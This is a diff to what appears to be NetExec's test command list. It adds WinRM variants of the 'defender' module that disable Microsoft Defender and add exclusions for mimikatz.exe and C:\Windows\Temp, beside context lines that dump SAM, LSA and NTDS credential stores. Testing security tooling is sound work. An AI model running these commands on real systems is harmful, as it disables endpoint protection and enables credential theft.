@@ -234,6 +234,18 @@ netexec wmi TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender
 netexec wmi TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=remove EXTENSION=txt
 netexec wmi TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=exclude PATH=C:\\Windows\\Temp PROCESS=mimikatz.exe EXTENSION=txt
 netexec wmi TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=remove PATH=C:\\Windows\\Temp PROCESS=mimikatz.exe EXTENSION=txt
+netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender
+netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=check
+netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=disable
+netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=enable
+netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=exclude PATH=C:\\Windows\\Temp
+netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=remove PATH=C:\\Windows\\Temp
+netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=exclude PROCESS=mimikatz.exe
+netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=remove PROCESS=mimikatz.exe
+netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=exclude EXTENSION=txt
+netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=remove EXTENSION=txt
+netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=exclude PATH=C:\\Windows\\Temp PROCESS=mimikatz.exe EXTENSION=txt
+netexec winrm TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M defender -o ACTION=remove PATH=C:\\Windows\\Temp PROCESS=mimikatz.exe EXTENSION=txt
 netexec wmi TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M ntds-dump-raw
 netexec wmi TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M ntds-dump-raw -o TARGET=SAM,LSA,NTDS
 ##### LDAP
